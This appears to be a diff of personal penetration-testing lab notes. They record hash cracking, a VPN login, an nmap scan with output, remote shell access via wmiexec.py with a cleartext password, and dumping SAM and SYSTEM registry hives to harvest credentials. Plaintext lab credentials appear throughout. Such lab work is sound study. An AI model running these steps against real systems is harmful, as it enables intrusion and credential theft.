@@ -16,7 +16,84 @@ john -w=/usr/share/wordlists/rockyou.txt --format=netntlmv2 alice.ntlmv2
 
 * Challenge 2 
 
-*Note* Downloaded the openvpn profiles, will use the internal
+*Note* Downloaded the openvpn profiles, will use the internal profile
+~openvpn shared_533-redinternal.ovpn~
+then login: password 0efaf267b804
+username: shared
+*Note* uncommented 
 
-** Obtain 
+Old Alice's IP is:
+*10.58.122.100*
 
+New Alice IP is:
+*10.59.4.20*
+
+
+
++ What would you do next with the password?
+Some users could be local administrators on their systems, then you can connect back
+to the systems and execute commands.
+
++ Interactions
+  * remote powershell
+  * WMI
+  * smbexec
+  * pth - pass the hash tools - start with ~pth-wmic~
+
+** Log
+
+fingerprinting the host with nmap
+nmap -O -v 10.59.4.20
+
+*** Nmap scan
+Nmap scan report for 10.59.4.20
+Host is up (0.089s latency).
+Not shown: 991 closed ports
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49156/tcp open  unknown
+MAC Address: 00:16:3E:2E:DE:40 (Xensource)
+
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.70%E=4%D=6/27%OT=135%CT=1%CU=37656%PV=Y%DS=1%DC=D%G=Y%M=00163E%
+OS:TM=5D14A79B%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=I%CI=I%II=
+OS:I%SS=S%TS=7)OPS(O1=M52CNW8ST11%O2=M52CNW8ST11%O3=M52CNW8NNT11%O4=M52CNW8
+OS:ST11%O5=M52CNW8ST11%O6=M52CST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2
+OS:000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M52CNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=
+OS:80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3
+OS:(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%
+OS:F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y
+OS:%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%R
+OS:D=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)I
+OS:E(R=Y%DFI=N%T=80%CD=Z)
+
+*** Pass the hash
+~pth-wmic~ 
+~wmiexec.py~
+/usr/share/doc/python-impacket/examples/wmiexec.py
+/usr/share/doc/python-impacket/examples/wmiexec.py
+
+usage: wmiexec.py alice:Elefant15@10.59.4.20
+
+*got shell*
+
+then dumped SAM and SYSTEM with 
+reg save HKLM\SAM r-sam.hive
+reg save HKLM\SYSTEM r-system.hive
+
+donwloaded the dumps with ~get~ in wmi shell
+
+*** Note: mimikatz help
+[[https://blog.ropnop.com/practical-usage-of-ntlm-hashes/][Practical usage of ntlm hashes]]
+
+Question: are we already a local admin
+
++ When we have 
